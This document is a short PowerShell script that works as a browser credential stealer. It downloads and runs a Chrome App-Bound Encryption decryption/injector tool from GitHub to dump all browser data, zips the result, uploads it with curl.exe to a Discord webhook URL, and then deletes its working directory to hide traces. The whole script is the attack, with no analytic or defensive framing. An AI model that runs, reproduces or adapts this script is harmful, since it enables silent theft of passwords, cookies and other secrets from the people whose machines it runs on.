
mkdir "$env:TEMP\work" -Force; cd "$env:TEMP\work"

iwr -Uri "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip" -OutFile "data.zip" -UseBasicParsing

Expand-Archive -Path "data.zip" -DestinationPath "ext" -Force

cd ext\*

.\chromelevator_x64.exe all -f -o out

Compress-Archive -Path "out\*" -DestinationPath "cosa.zip" -Force

curl.exe -F "file=@cosa.zip" "https://discordapp.com/api/webhooks/1502593734502514722/W7fg9W5OKKH0gedYJV44ribRUIQJhMnlkiF4TZiHVct57zKo8Rz8Yf01zV3Q1WXxXSrt"

cd $env:TEMP; rm -Recurse -Force "$env:TEMP\work"